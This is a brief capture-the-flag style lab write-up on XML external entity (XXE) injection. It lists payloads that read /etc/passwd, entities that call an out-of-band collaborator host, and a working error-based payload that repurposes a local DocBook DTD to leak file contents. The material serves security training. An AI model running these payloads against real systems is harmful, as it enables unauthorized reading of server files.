Lab #9 - Exploiting XXE to retrieve data by repurposing a local DTD

Target Goal - Exploit the XXE injection to trigger an error message containing the contents of the /etc/passwd file.

Analysis:

Regular entity:
--------------

<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

Blind Regular entity:
---------------------

<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://k9udhvjgzvaf2v2dlzdf10um5db3zs.oastify.com">]>

Parameter entity:
----------------

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://k9udhvjgzvaf2v2dlzdf10um5db3zs.oastify.com"> %xxe;]>

Repurposing a Local DTD
-----------------------

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/doesnotexit"> %xxe;]>


<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>

